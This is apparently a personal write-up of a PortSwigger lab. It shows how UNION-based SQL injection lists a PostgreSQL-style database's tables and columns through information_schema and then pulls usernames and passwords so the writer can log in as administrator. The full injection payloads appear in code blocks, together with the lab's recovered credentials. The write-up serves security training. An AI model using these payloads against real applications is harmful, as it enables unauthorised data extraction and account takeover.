---
Category: SQL-Injection
LAB: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
Difficulty: Practitioner
Featured: "True"
---
---

We will be following the past labs, and working on top of them, so the only change in this lab is that they are not providing the name of the tables we need to retrieve data from, and you may be asking yourself:

> How do we figure out the name of the table?

we will be using the `information-schema` to retrieve sensitive data
- Information about `information-schema` : [Link](https://www.postgresql.org/docs/current/information-schema.html)

>The information schema consists of a set of views that contain information about the objects defined in the current database.

So, as always, we will start by identifying the vulnerable entry point, the amount of columns and the injectable field

![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784451639168.webp)

In this case we have figured out that there are 2 columns through `group by` and the injectable field through `union select NULL, NULL ...`

And then we queried `information_schema` for the `table_name` to retrieve the tables

```
' union select NULL, table_name from information_schema.tables --
```

This is what it would look from a areal view from the database

![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784451802891.webp)

And this is the result

![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784451907520.webp)

these are the tables from which we can find interesting ones like `users_znudzt`

Now we just need to fine tune the query to get the information we want doing so from `information-schema` but looking for the `columns` now

```
' union select NULL, column_name from information_schema.columns where table_name = 'users_znudzt' --
```

![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784452153295.webp)

This would be an areal view

![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784452233860.webp)


And now that we already now the column names and the table names we just need to query what we need from it, and in this case becasue

```
' union select NULL, username_clhnyf  ||':'|| password_cvuwtl from users_znudzt --
```


![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784452367321.webp)


|  **`users`**  |   **`passwords`**    |
| :-----------: | :------------------: |
|    carlos     | fgunvx9k6iuvli08k6th |
| administrator | e2s92ynt1npb7zxlritp |
|    wiener     | d4qjhkijxcr2eu45u4rk |


And this would be an areal view

![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784452529600.webp)

To finish the lab we only need to log in as the administrator


![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784452644942.webp)

![](../../../0.%20Assets/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases-1784452652595.webp)

